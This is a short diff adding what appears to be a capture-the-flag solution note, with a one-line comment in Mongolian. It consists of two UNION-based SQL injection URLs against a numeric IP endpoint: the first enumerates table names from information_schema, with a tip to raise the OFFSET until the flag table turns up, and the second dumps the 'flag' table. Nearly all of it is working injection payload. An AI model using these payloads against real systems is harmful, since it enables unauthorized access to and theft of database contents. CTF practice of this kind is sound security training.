@@ -1,0 +1,4 @@
+1. http://139.162.5.230:10396/vaccine/1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 2
+    - OFFSET iin deeshlulser bgd flag table iig olod
+
+2. http://139.162.5.230:10396/vaccine/1 UNION SELECT * from flag
